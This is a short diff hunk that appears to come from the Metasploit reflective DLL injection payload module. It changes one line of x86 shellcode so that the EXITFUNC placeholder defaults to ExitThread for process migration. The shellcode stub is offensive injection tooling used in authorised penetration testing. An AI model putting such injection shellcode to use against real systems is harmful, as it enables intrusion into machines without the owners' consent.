@@ -82,7 +82,7 @@ module Payload::Windows::ReflectiveDllInject
 			"\x68\x04\x00\x00\x00" +            # push 0x4            ; signal we have attached
 			"\x50" +                            # push eax            ; some value for hinstance
 			"\xFF\xD0" +                        # call eax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
-			"\x68\xDE\xC0\xAD\xDE" +            # push 0xDEADC0DE     ; our EXITFUNC placeholder
+			"\x68\xE0\x1D\x2A\x0A" +            # push 0x0A2A1DE0     ; our EXITFUNC placeholder (Default to ExitThread for migration)
 			"\x68\x05\x00\x00\x00" +            # push 0x5            ; signal we have detached
 			"\x50" +                            # push eax            ; some value for hinstance
 			"\xFF\xD3"                          # call ebx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
